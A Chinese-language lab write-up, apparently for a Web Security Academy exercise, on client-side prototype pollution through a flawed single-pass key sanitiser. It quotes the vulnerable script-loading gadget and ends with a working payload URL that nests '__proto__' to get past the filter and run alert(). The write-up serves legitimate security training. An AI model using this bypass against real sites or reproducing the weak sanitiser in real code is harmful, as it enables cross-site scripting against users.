# 实验室：通过有缺陷的清理实现客户端原型污染

本实验室存在通过客户端原型污染导致的 DOM XSS 漏洞。尽管开发者已采取措施防止原型污染，但这些措施很容易被绕过。

要解决本实验：

1. 找到一个可用于向全局 `Object.prototype` 添加任意属性的源。
2. 识别一个允许执行任意 JavaScript 的小工具属性。
3. 结合这两者以调用 `alert()`。

## 步骤

半自动（仅对代码进行检索与略读）
- 首页使用 burp 浏览器开发者工具栏中 DOM 插件的搜索功能
- 在源发现冗余构造载荷，以及普通源
- 点击普通源的栈追踪，查看控制台的对应代码
    ```js
    // searchLoggerFiltered.js

    async function searchLogger() {
        let config = {
            params: deparam(new URL(location).searchParams.toString())
        };
        if (config.transport_url) {
            let script = document.createElement('script');
            script.src = config.transport_url;
            document.body.appendChild(script);
        }
        if (config.params && config.params.search) {
            await logQuery('/logger', config.params);
        }
    }

    // 非递归清理，仅1次净化
    function sanitizeKey(key) {
        let badProperties = ['constructor', '__proto__', 'prototype'];
        for (let badProperty of badProperties) {
            key = key.replaceAll(badProperty, '');
        }
        return key;
    }

    window.addEventListener("load", searchLogger);
    ```

    - 输入源 
        ```js
        deparam(new URL(location).searchParams.toString())
        ```
    - 工具
        `config.transport_url`

    - 汇
        `script.src`

- 仅检索 `deparamSanitised.js` 文件代码
    - 污染源
        ```js
        obj[sanitizeKey(key)] = val;
        ```
        - 调用非递归清理函数后设置属性

- 根据代码略读与 DOM 插件载荷，构造原型污染载荷
    `https://id.web-security-academy.net/?__pro__proto__to__[transport_url]=data:javascript,alert()`
